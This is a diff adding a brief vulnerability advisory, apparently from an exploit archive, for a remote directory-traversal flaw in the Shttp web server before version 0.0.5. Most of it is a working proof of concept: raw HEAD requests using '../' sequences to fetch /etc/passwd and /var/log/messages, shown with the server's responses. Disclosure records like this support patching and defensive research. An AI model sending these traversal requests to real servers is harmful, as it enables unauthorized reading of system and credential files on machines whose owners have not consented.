@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/26212/info
+
+Shttp is prone to a remote directory-traversal vulnerability.
+
+A remote attacker can exploit this issue by using directory-traversal sequences to retrieve arbitrary files on a victim user's computer.
+
+Versions prior to Shttp0.0.5 are vulnerable to this issue.
+
+HEAD /../../etc/passwd HTTP/1.0
+
+HTTP/1.1 400 Bad Request
+Content-Type: text/html
+Server: Shttp/ServerKit
+Date: Thu, 25 Oct 2007 16:31:30 GMT
+Connection: close
+
+
+HEAD /../../var/log/messages HTTP/1.0
+
+HTTP/1.1 200 OK
+Content-Length: 178455
+Content-Type: text/plain
+Last-Modified: Thu, 25 Oct 2007 16:36:39 GMT
+Server: Shttp/ServerKit
+Date: Thu, 25 Oct 2007 16:42:32 GMT
+Connection: close 
